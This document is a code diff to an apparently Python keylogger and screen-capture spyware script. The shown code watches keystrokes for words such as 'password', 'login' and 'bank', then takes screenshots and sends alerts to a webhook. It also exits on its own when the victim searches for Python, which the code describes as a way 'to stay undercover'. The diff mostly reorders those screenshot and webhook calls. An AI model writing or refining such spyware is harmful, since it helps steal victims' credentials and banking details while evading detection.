@@ -219,6 +219,7 @@ def send_to_webhook_pic(filename):
 def screenshot():
     while True:
         try:
+
             print("Taking screenshot...")
             now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
             filename = f"screen_{now}.png"
@@ -241,20 +242,24 @@ def screenshot():
 
 def monitor_input():
     while True:
-        time.sleep(1)  # Warte 1 Sekunde zwischen den Checks
+        time.sleep(1)
         with lock:
             if "pyt" in keystrokes.lower():
                 send_to_webhook("User searched for Python. Killing process to stay undercover.")
-                os._exit(0) 
+                os._exit(0)
             elif "pas" in keystrokes.lower():
+                screenshot()
                 send_to_webhook("@everyone Password!")
-                screenshot()
+                send_to_webhook("#screenshots")
             elif "log" in keystrokes.lower():
+                screenshot()
                 send_to_webhook("@everyone Login!")
-                screenshot()
+                send_to_webhook("#screenshots")
             elif "bank" in keystrokes.lower():
-                send_to_webhook("@everyone Bank!")
                 screenshot()
+                send_to_webhook("@everyone Bank!")
+                send_to_webhook("#screenshots")
+                
 
 
 # Run kill.bat file at the start
